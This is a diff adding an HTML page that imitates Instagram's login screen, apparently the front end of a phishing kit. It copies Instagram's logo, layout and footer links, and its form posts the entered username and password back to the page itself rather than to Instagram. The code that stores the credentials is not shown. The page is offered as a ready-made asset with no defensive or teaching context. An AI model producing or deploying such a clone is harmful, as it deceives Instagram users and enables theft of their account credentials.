@@ -1,0 +1,84 @@
+
+<!DOCTYPE html>
+<html lang="en" >
+
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+    <link rel="shortcut icon" type="image/x-icon" href="img/instagram.ico.png">
+    <link rel="stylesheet" href="css/style.css">
+
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+
+</head>
+
+<body>
+
+<div class="login">
+
+<div style="padding-left: 120px; padding-top: 40px;">
+<i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+</div>
+
+  <form action="" method="POST">
+  
+  <input placeholder="Phone number, username, or email" type="text" name="username" >
+  <input placeholder="Password" type="password" name="password">
+  
+  <input type="submit" value="Log In" /><br>
+
+  </form>
+
+  <div class="divider"><b>OR</b></div>
+
+  <div class="fbwrapper"><div class="fb"><a href="https://facebook.com"><img src="https://i.imgur.com/exksovo.png">  Log in with Facebook</a></div></div>
+
+  <div class="forgotwrapper"><div class="forgot"><a href="https://instagram.com">Forgot password?</a></div></div>
+
+  
+</div>
+
+
+<div class="infobox">
+  
+  <p>Don't have an account? <a href="https://instagram.com">Sign up</a></p>
+  
+</div>
+
+<div class="apps">
+
+  <p>Get the app.</p>
+  <span><a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="https://i.imgur.com/lREV6Qa.png" height="45px" width="153px"></a><a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRR9_gALAAHKOzMSO3MkAOZ0JJtC%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="https://i.imgur.com/DFQNKXK.png" height="45" width="151px"></a></span>
+  
+</div>
+
+<div class="footer">
+  <p>
+      <a href="https://www.instagram.com/about/us/">ABOUT US</a>
+      <a href="https://help.instagram.com/">SUPPORT</a>
+      <a href="https://instagram-press.com/">PRESS</a>
+      <a href="https://www.instagram.com/developer/">API</a>
+      <a href="https://www.instagram.com/about/jobs/">JOBS</a>
+      <a href="https://help.instagram.com/519522125107875">PRIVACY</a>
+      <a href="https://help.instagram.com/581066165581870">TERMS</a>
+      <a href="https://www.instagram.com/explore/locations/">DIRECTORY</a>
+      <a href="https://www.instagram.com/directory/profiles/">PROFILES</a>
+      <a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a>
+      <a href="">LANGUAGE</a>
+      <span>© 2019 INSTAGRAM</span>
+  </p>
+</div>
+
+  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+
+
+
+
+
+</body>
+
+</html>
